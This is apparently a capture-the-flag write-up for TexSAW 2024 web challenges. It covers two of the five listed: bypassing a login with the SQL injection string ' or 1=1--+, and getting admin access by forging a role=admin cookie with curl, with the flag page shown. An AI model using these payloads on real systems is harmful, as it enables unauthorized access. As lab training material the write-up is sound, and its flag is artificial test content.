### TexSAW 2024

### Challenges
- Web
  - Login Attempt
  - Crazy Cookie
  - Extreme Security
  - Over 9000
  - Ask, and it shall be given to you

### Challenge 1: Login Attempt

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b56385c4-6a19-48c3-9141-f62b089907d0)

- The challenge is a basic sql injection challenge which requires bypassing a login page.I bypassed the login page with a true sql statement `' or 1=1--+`.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/881b97ae-b2a5-44c1-8cf8-3a073fa2fba9)

- Flag

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/582ef905-850d-421f-afa6-30e09a32c793)

### Challenge 2: Crazy Cookie

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/61d8f77f-ea45-4d9f-8bad-e5aae4d212d2)

- The challenge's objective is to bypass this login page.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/35f367af-e620-4897-8fb7-f0d3a025986a)

- After analyzing the response of the response with curl, I noticed that the cookie contains a key 'role' with the value 'user'.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3970f7f8-e7d5-4462-a10e-7e7e81bc9892)

- I got the flag by setting the `role` value to admin

          ❯ curl http://3.23.56.243:9002/ -H 'Cookie: role=admin; Path=/'
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Flag</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                    background-color: #f3f3f3;
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    background-color: #fff;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    padding: 20px;
                }
                h1 {
                    color: #4CAF50;
                    margin-top: 0;
                }
                .flag {
                    font-size: 24px;
                    color: #FF5722; /* Orange color */
                    margin-top: 20px;
                    padding: 10px;
                    border: 2px solid #FF5722; /* Orange border */
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Flag!</h1>
                <div class="flag">
                    texsaw{cR@zy_c00Ki3}
                </div>
            </div>
        </body>
        </html>           
        



